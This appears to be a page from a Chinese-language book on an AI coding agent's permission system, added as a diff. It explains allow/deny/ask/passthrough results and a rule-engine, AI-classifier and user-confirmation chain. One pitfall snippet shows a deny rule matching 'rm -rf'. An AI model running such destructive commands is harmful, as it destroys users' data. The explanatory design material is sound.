+<p>权限检查的返回值不是简单的 allow/deny，而是四种不同语义的 <code>PermissionResult</code>（<code>src/utils/permissions/PermissionResult.ts</code>，类型定义在 <code>src/types/permissions.ts</code>）：</p>
+<pre><code class="language-typescript">// src/types/permissions.ts（通过 PermissionResult.ts 重导出）
+type PermissionResult = {
+  behavior: 'allow' | 'deny' | 'ask' | 'passthrough'
+  // ...其他字段
+}
+</code></pre>
+<p><strong>四种结果的语义</strong>：</p>
+<div class="table-wrapper"><table><thead><tr><th>结果</th><th>语义</th><th>触发动作</th></tr></thead><tbody>
+<tr><td><code>allow</code></td><td>明确允许，不询问</td><td>直接执行工具</td></tr>
+<tr><td><code>deny</code></td><td>明确拒绝，不询问</td><td>返回错误，不执行</td></tr>
+<tr><td><code>ask</code></td><td>需要用户确认</td><td>展示权限对话框，等待用户</td></tr>
+<tr><td><code>passthrough</code></td><td>当前层不决定，传递给下一层</td><td>继续检查下一层</td></tr>
+</tbody></table>
+</div>
+<p><code>passthrough</code> 是三层决策架构的关键——规则引擎未命中时返回 <code>passthrough</code>，交由 AI 分类器处理；分类器置信度不足时也返回 <code>passthrough</code>，最终交由用户确认。每一层只处理自己有把握的情况（<code>src/utils/permissions/PermissionResult.ts</code>）。</p>
+<h2 id="踩坑"><a class="header" href="#踩坑">踩坑</a></h2>
+<h3 id="-让规则引擎处理需要上下文理解的权限决策"><a class="header" href="#-让规则引擎处理需要上下文理解的权限决策">❌ 让规则引擎处理需要上下文理解的权限决策</a></h3>
+<pre><code class="language-typescript">// ❌ 错误：规则引擎无法理解"数据恢复场景下 rm 是合理的"
+if (command.includes('rm -rf')) return 'deny'  // 过于简单粗暴
+</code></pre>
+<p>规则引擎（第 1 层）只做模式匹配（<code>src/utils/permissions/permissions.ts:59</code>），无法理解上下文。对于需要理解意图的决策，应该升级到 AI 分类器层（第 2 层）。</p>
+<h3 id="-请求用户对每个操作都手动批准造成批准疲劳"><a class="header" href="#-请求用户对每个操作都手动批准造成批准疲劳">❌ 请求用户对每个操作都手动批准，造成"批准疲劳"</a></h3>
+<p>每次文件读取都弹出确认框，用户很快开始无脑点 Yes——这比自动批准更危险。合理的权限系统应该自动批准低风险操作，只对高风险操作（写入、执行、网络请求）请求确认。</p>
+<h3 id="-记忆权限时没有设置过期策略"><a class="header" href="#-记忆权限时没有设置过期策略">❌ 记忆权限时没有设置过期策略</a></h3>
+<p>"总是允许读 ./src 目录" 这条记忆在新会话中仍然有效，但如果用户切换了项目，这个授权就不再合适。权限记忆应该绑定到会话或项目，而不是全局有效。</p>
+<h2 id="你能做什么"><a class="header" href="#你能做什么">你能做什么</a></h2>
+<ul>
+<li>
+<p><strong>用多层决策替代单一复杂引擎</strong>。当你需要既快又准的判断时，不要试图在一个地方处理所有情况。分为"确定性快速层"和"模糊性智能层"，让它们协作。</p>
+</li>
+<li>
+<p><strong>让每层只对自己有把握的情况发言</strong>。引入 <code>passthrough</code> 这样的中间态，允许决策层说"我不知道，问下一层"。这比每层都被迫猜测要好得多。</p>
+</li>
+<li>
+<p><strong>确保严格的规则总是优先</strong>。如果有多个权力来源（企业、用户、默认），让最严格的规则（deny）始终最先检查。这建立了一个明确的信任链。</p>
+</li>
+<li>
+<p><strong>对已知安全的操作白名单</strong>。不要让所有请求都经过昂贵的判断。如果你确信某类操作无害，直接放行，节省资源给真正需要判断的操作。</p>
+</li>
+</ul>
+<hr />
+<h2 id="向后链接"><a class="header" href="#向后链接">向后链接</a></h2>
+<p>权限决策的三层架构为后续章节奠定了基础。第 16 章将深入第二层——AI 分类器的实现细节，包括如何用 LLM 判断 LLM 的操作安全性，以及如何避免元循环递归。第 17 章讨论第一层（规则引擎）的规则数据模型和优先级协调。第 18 章介绍 Hooks 系统如何在这个权限决策框架中注入自定义逻辑。</p>
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="../part3/ch14.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+
+                            <a rel="next prefetch" href="../part4/ch16.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="../part3/ch14.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+
+                    <a rel="next prefetch" href="../part4/ch16.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+            </nav>
+
+        </div>
+
+
+
+
+        <script>
+            window.playground_copyable = true;
+        </script>
+
+
+        <script src="../elasticlunr.min.js"></script>
+        <script src="../mark.min.js"></script>
+        <script src="../searcher.js"></script>
+
+        <script src="../clipboard.min.js"></script>
+        <script src="../highlight.js"></script>
+        <script src="../book.js"></script>
+
+        <!-- Custom JS scripts -->
+        <script src="../theme/mermaid-init.js"></script>
+
+
+    </div>
+    </body>
+</html>
